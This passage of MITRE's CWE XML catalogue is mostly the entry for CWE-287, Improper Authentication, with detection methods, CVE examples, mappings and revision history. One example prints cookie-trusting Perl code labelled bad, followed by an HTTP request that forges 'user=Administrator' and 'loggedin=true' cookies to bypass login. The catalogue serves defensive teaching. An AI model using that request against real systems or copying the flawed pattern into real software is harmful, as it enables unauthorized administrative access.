               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Alternate_Terms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Missing or Inconsistent Access Control</Previous_Entry_Name>
            <Previous_Entry_Name Date="2011-03-29">Improper Access Control (Authorization)</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="287" Name="Improper Authentication" Abstraction="Class" Structure="Simple" Status="Draft" Diagram="/data/images/CWE-287-Diagram.png">
         <Description>When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="ICS/OT" Prevalence="Often"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>authentification</Term>
               <Description>An alternate term is "authentification", which appears to be most commonly used by people from non-English-speaking countries.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>AuthN</Term>
               <Description>"AuthN" is typically used as an abbreviation of "authentication" within the web application security community. It is also distinct from "AuthZ," which is an abbreviation of "authorization." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>AuthC</Term>
               <Description>"AuthC" is used as an abbreviation of "authentication," but it appears to used less frequently than "AuthN."</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting certain types of authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Manual static analysis is useful for evaluating the correctness of custom authentication mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use an authentication framework or library such as the OWASP ESAPI Authentication feature.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code intends to ensure that the user is already logged in. If not, the code performs authentication with the user-provided username and password. If successful, it sets the loggedin and user cookies to "remember" that the user has already logged in. Finally, the code performs administrator tasks if the logged-in user has the "Administrator" username, as recorded in the user cookie.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $q = new CGI;<xhtml:br/>
                     <xhtml:br/>if ($q-&gt;cookie('loggedin') ne "true") {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:1em;">ExitError("Error: you need to log in first");</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">
                              <xhtml:div># Set loggedin and user cookies.<xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:1em;">-name =&gt; 'loggedin',<xhtml:br/>-value =&gt; 'true'<xhtml:br/>);</xhtml:div>
                                 <xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:1em;">-name =&gt; 'user',<xhtml:br/>-value =&gt; $q-&gt;param('username')<xhtml:br/>);</xhtml:div>
                              </xhtml:div>
                           </xhtml:div>}</xhtml:div>
                     </xhtml:div>}<xhtml:br/>
                     <xhtml:br/>if ($q-&gt;cookie('user') eq "Administrator") {<xhtml:div style="margin-left:1em;">DoAdministratorTasks();</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:</Body_Text>
               <Example_Code Nature="Attack">
                  <xhtml:div>GET /cgi-bin/vulnerable.cgi HTTP/1.1<xhtml:br/>Cookie: user=Administrator<xhtml:br/>Cookie: loggedin=true<xhtml:br/>
                     <xhtml:br/>[body of request]</xhtml:div>
               </Example_Code>
               <Body_Text>By setting the loggedin cookie to "true", the attacker bypasses the entire authentication check. By using the "Administrator" value in the user cookie, the attacker also gains privileges to administer the software.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-117">
               <Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts [REF-236]. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</Intro_Text>
               <References>
                  <Reference External_Reference_ID="REF-236"/>
               </References>
            </Demonstrative_Example>
	    <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	      <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	      <Body_Text>Multiple vendors did not use any authentication or used client-side authentication for critical functionality in their OT products.</Body_Text>
	    </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
		   <Observed_Example>
			 <Reference>CVE-2022-35248</Reference>
			 <Description>Chat application skips validation when Central Authentication Service
			 (CAS) is enabled, effectively removing the second factor from
			 two-factor authentication</Description>
			 <Link>https://www.cve.org/CVERecord?id=CVE-2022-35248</Link>
		   </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-36436</Reference>
               <Description>Python-based authentication proxy does not enforce password authentication during the initial handshake, allowing the client to bypass authentication by specifying a 'None' authentication type.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-36436</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30034</Reference>
               <Description>Chain: Web UI for a Python RPC framework does not use regex anchors to validate user login emails (CWE-777), potentially allowing bypass of OAuth (CWE-1390).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29951</Reference>
               <Description>TCP-based protocol in Programmable Logic Controller (PLC) has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29951</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-29952</Reference>
               <Description>Condition Monitor uses a protocol that does not require authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-29952</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30313</Reference>
               <Description>Safety Instrumented System uses proprietary TCP protocols with no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30313</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30317</Reference>
               <Description>Distributed Control System (DCS) uses a protocol that has no authentication.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30317</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-33139</Reference>
               <Description>SCADA system only uses client-side authentication, allowing adversaries to impersonate other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-33139</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-3116</Reference>
               <Description>Chain: Python-based HTTP Proxy server uses the wrong boolean operators (CWE-480) causing an  incorrect comparison (CWE-697) that identifies an authN failure if all three conditions are met instead of only one, allowing bypass of the proxy authentication (CWE-1390)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-3116</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-21972</Reference>
               <Description>Chain: Cloud computing virtualization platform does not require authentication for upload of a tar format file (CWE-306), then uses .. path traversal sequences (CWE-23) in the file to access unexpected files, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-21972</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-37415</Reference>
               <Description>IT management product does not perform authentication for some REST API requests, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-37415</Link>
            </Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2021-35033</Reference>
			  <Description>Firmware for a WiFi router uses a hard-coded password for a BusyBox shell, allowing bypass of authentication through the UART port</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2021-35033</Link>
			</Observed_Example>
			<Observed_Example>
			  <Reference>CVE-2020-10263</Reference>
			  <Description>Bluetooth speaker does not require authentication for the debug functionality on the UART port, allowing root shell access</Description>
			  <Link>https://www.cve.org/CVERecord?id=CVE-2020-10263</Link>
			</Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-13927</Reference>
               <Description>Default setting in workflow management product allows all API requests without authentication, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-13927</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-35395</Reference>
               <Description>Stack-based buffer overflows in SFK for wifi chipset used for IoT/embedded devices, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-35395</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2021-34523</Reference>
               <Description>Mail server does not properly check an access token before executing a Powershell command, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-34523</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-12812</Reference>
               <Description>Chain: user is not prompted for a second authentication factor (CWE-287) when changing the case of their username (CWE-178), as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-12812</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-10148</Reference>
               <Description>Authentication bypass by appending specific parameters and values to a URI, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-10148</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-0688</Reference>
               <Description>Mail server does not generate a unique key during installation, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-0688</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-14623</Reference>
               <Description>LDAP Go package allows authentication bypass using an empty password, causing an unauthenticated LDAP bind</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-14623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3421</Reference>
               <Description>login script for guestbook allows bypassing authentication by setting a "login_ok" parameter to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3421</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2382</Reference>
               <Description>admin script allows authentication bypass by setting a cookie value to "LOGGEDIN".</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2382</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1048</Reference>
               <Description>VOIP product allows authentication bypass using 127.0.0.1 in the Host header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1048</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>product uses default "Allow" action, instead of default deny, leading to authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2168</Reference>
               <Description>chain: redirect without exit (CWE-698) leads to resultant authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3107</Reference>
               <Description>product does not restrict access to a listening port for a critical service, allowing authentication to be bypassed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3107</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1596</Reference>
               <Description>product does not properly implement a security-related configuration setting, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1596</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2422</Reference>
               <Description>authentication routine returns "nil" instead of "false" in some situations, allowing authentication bypass using an invalid username.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2422</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3232</Reference>
               <Description>authentication update script does not properly handle when admin does not select any authentication modules, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3232</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3231</Reference>
               <Description>use of LDAP authentication with anonymous binds causes empty password to result in successful authentication</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3231</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3435</Reference>
               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3435</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0408</Reference>
               <Description>chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>Authentication</Functional_Area>
         </Functional_Areas>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Authentication Error</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A3</Entry_ID>
               <Entry_Name>Broken Authentication and Session Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>1</Entry_ID>
               <Entry_Name>Insufficient Authentication</Entry_Name>
            </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.1</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 3-3</Entry_ID>
             <Entry_Name>Req SR 1.2</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 1.1</Entry_Name>
           </Taxonomy_Mapping>
           <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			 <Entry_ID>Part 4-2</Entry_ID>
             <Entry_Name>Req CR 1.2</Entry_Name>
           </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="114"/>
            <Related_Attack_Pattern CAPEC_ID="115"/>
            <Related_Attack_Pattern CAPEC_ID="151"/>
            <Related_Attack_Pattern CAPEC_ID="194"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="57"/>
            <Related_Attack_Pattern CAPEC_ID="593"/>
            <Related_Attack_Pattern CAPEC_ID="633"/>
            <Related_Attack_Pattern CAPEC_ID="650"/>
            <Related_Attack_Pattern CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-236"/>
            <Reference External_Reference_ID="REF-237"/>
            <Reference External_Reference_ID="REF-238"/>
            <Reference External_Reference_ID="REF-239"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authentication&#34; Page 109"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>This CWE entry might be misused when lower-level CWE entries are likely to be applicable. It is a level-1 Class (i.e., a child of a Pillar).</Rationale>
            <Comments>Consider children or descendants, beginning with CWE-1390: Weak Authentication or CWE-306: Missing Authentication for Critical Function.</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
            </Reasons>
			<Suggestions>
			  <Suggestion CWE_ID="1390" Comment="Weak Authentication"/>
			  <Suggestion CWE_ID="306" Comment="Missing Authentication for Critical Function"/>
			</Suggestions>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">This can be resultant from SQL injection vulnerabilities and other issues.</Note>
			<Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Common_Consequences, Relationships, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Likelihood_of_Exploit, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
